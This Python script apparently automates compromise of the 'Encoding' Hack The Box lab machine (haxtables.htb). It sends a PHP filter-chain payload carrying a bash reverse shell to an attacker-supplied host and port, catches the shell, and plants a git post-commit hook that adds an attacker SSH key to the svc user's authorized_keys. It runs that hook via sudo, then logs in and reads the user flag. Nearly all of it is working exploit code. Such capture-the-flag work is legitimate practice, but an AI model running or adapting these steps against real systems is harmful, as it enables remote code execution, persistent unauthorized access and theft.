#!/usr/bin/env python

import signal
import requests
import os, sys
import subprocess
from multiprocessing import Process
from pwn import log, listen, ssh
import argparse
import atexit
from typing import List

SUBDOMAIN_URLS = {
    "IMAGE": 'image.haxtables.htb/actions/action_handler.php?page=',
    "API": 'http://api.haxtables.htb/v3/tools/string/index.php'
}

PHP_FILTER_CHAIN_PATH = 'php_filter_chain_generator/php_filter_chain_generator.py'

class Exploit:

    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def signal_handler(self, sig, frame) -> None:
        log.failure('Exiting...')
        sys.exit(1)

    def cleanup(self, runningProcesses: List[Process]) -> None:
        for process in runningProcesses:
            if process.is_alive():
                process.terminate()

        self.removeSshFiles()

    def makeRequest(self) -> None:
        PhpFilterCommand = ['python3', 
                            PHP_FILTER_CHAIN_PATH, 
                            '--chain', 
                            f"""<?php system("bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"); ?>"""]

        # Generate a php filter chain to get a reverse shell
        PhpFilterProcess = subprocess.Popen(PhpFilterCommand, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        ScriptOutput, ScriptError = PhpFilterProcess.communicate()

        if ScriptError:
            print()
            log.failure('There was an error generating php filter chain, please check the error below:')
            print(ScriptError.decode('utf-8'))
            sys.exit(1)

        # Get the php filter chain (ignoring the first line which is optional metadata)
        PhpFilterChain = ScriptOutput.decode('utf-8').strip().split('\n')[-1]

        # Send the php filter chain to the API
        jsonData = {
        'action': 'str2hex',
        'file_url' : f'{SUBDOMAIN_URLS["IMAGE"]}{PhpFilterChain}',
        }

        requests.post(SUBDOMAIN_URLS['API'], json=jsonData)

    def generateSshKey(self) -> None:
        subprocess.Popen(['ssh-keygen', '-t', 'ed25519', '-f', 'svc', '-q', '-N', ''])
        
        if not os.path.isfile('svc'):
            log.failure('There was an error generating the ssh key')
            sys.exit(1)

        os.chmod('svc', 0o600)

    def removeSshFiles(self) -> None:
        if os.path.isfile('svc'):
            os.remove('svc')

        if os.path.isfile('svc.pub'):
            os.remove('svc.pub')

    def run(self) -> None:
        signal.signal(signal.SIGINT, self.signal_handler)       

        isPhpFilterChainScript = os.path.isfile(PHP_FILTER_CHAIN_PATH)
        
        if not isPhpFilterChainScript:
            print()
            log.failure('You must download the php_filter_chain_generator script from https://github.com/synacktiv/php_filter_chain_generator' 
                        'and place it in the same directory as this script.')
            sys.exit(1)

        # Make a request to the API to get a reverse shell
        try:
            process = Process(target=self.makeRequest)
            sshKeyProcess = Process(target=self.generateSshKey)

            sshKeyProcess.start()
            process.start()
        except Exception as e:
            log.error('There was an error when making the API request or generating the SSH key, please look below:')
            print(e)
            self.cleanup([process, sshKeyProcess])
            sys.exit(1)

        # Wait for the ssh key to be generated
        sshKeyProcess.join()

        atexit.register(self.cleanup, [process, sshKeyProcess])

        # Start a listener
        with listen(self.lport, timeout=20) as shell:
            if shell.wait_for_connection():
                log.success('Got a shell as www-data!')
                # Skip the first two lines of the shell, junk data
                shell.recvline()
                shell.recvline()

                # Open the svc.pub file and read the contents
                with open('svc.pub', 'rb') as f:
                    svcPubKey = f.read().strip()

                shell.sendline(b'cd /var/www/image/.git/hooks')
                shell.sendline(b"""echo -e 'mkdir -p /home/svc/.ssh\necho \
                                "\n%s" >> /home/svc/.ssh/authorized_keys \
                                \nchmod 600 /home/svc/.ssh/authorized_keys' | tee post-commit""" % svcPubKey)
                shell.sendline(b'chmod +x post-commit')
                shell.sendline(b'cd /var/www/image')
                shell.sendline(b'git --work-tree /etc/ add /etc/hostname')
                shell.sendline(b'sudo -u svc /var/www/image/scripts/git-commit.sh')
                shell.close()

        with ssh(user='svc', host='haxtables.htb', keyfile='svc') as ssh_session:
            if ssh_session.connected():
                ssh_session.system('cd /home/svc')
                output = ssh_session.system('cat user.txt')

                flag = output.recvall().decode('utf-8').strip()
                log.success(f"User flag: {flag}") # Print the user flag
                ssh_session.close()

        # Remove the ssh files
        self.removeSshFiles()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='AutoPwn for svc user on Haxtables (Encoding HTB machine) [RCE]')

    parser.add_argument('-l', '--lhost', type=str, required=True, help='Local host to receive reverse shell')
    parser.add_argument('-p', '--lport', type=int, required=True, help='Local port to receive reverse shell')

    args = parser.parse_args()

    exploit = Exploit(args.lhost, args.lport)
    exploit.run()
